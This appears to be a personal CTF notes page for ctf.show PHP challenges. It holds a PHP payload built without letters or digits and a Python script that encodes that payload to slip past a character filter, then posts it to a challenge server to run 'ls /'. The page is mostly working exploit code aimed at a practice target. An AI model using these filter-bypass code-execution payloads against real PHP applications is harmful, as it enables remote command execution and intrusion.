# 4
	- ```php
	  $_=(_/_._)[0];
	  $__=++$_;
	  $__=_.++$_.$__;
	  $_++.$_++;
	  $__.=(++$_).(++$_);
	  $$__[_]($$__[0]);
	  ```
- # 5
	- ```python
	  payload = """
	  $_=_(_/_)[_];
	  $你=++$_;
	  $你=_.++$_.$你;
	  ++$_;
	  ++$_;
	  $你.=++$_.++$_;
	  $$你[_]($$你[吗]);
	  """
	  payload = payload.replace("\n", "")
	  payload = payload.encode()
	  payload = payload.replace("你".encode(), b"\xff").replace("吗".encode(), b"\xfe")
	  print(len(payload))
	  # print(re.search("[a-zA-Z0-9!'@#%^&*:{}\-<\?>\"|`~\\\\]", payload))
	  print(payload)
	  print("".join(hex(i).replace("0x", "%") for i in payload))
	  url = "http://2ce05fe9-0188-4689-be63-09776db9a902.challenge.ctf.show/"
	  r = base_post(url, data = {
	      "ctf_show": payload,
	      b"\xfe": "ls /",
	      "_": "var_dump",
	  })
	  print(r.text)
	  ```
	- requests传参数的坑
		- {{embed ((64cb9a6f-4ae1-417b-af8f-18485741a841))}}
		-